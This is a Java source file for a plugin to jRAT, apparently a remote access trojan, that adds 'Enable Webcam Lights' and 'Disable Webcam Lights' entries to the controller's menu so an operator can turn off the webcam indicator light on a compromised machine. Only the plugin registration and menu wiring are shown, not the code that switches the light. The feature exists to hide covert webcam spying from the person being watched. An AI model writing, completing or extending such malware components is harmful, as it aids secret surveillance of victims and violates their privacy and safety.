package jrat.plugin.dwl.client;

import iconlib.IconUtils;
import jrat.api.Plugin;
import jrat.api.ui.RATControlMenuEntry;
import jrat.api.ui.RATMenuItem;

import javax.swing.ImageIcon;

public class DWLPlugin extends Plugin {
	
	public static final short HEADER = 110;

	public static RATControlMenuEntry entry;
	public static boolean enabled;
	
	public DWLPlugin() {
		super("Disable Webcam Lights", "1.2", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab");

		try {
			icon = new ImageIcon(getResource("icons/icon.png"));
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		RATMenuItem entry = new RATMenuItem(new MenuListener(true), "Enable Webcam Lights", IconUtils.getIcon("icon-plus", DWLPlugin.class));
		RATMenuItem.addItem(entry);

		entry = new RATMenuItem(new MenuListener(false), "Disable Webcam Lights", IconUtils.getIcon("icon-minus", DWLPlugin.class));
		RATMenuItem.addItem(entry);
	}

}
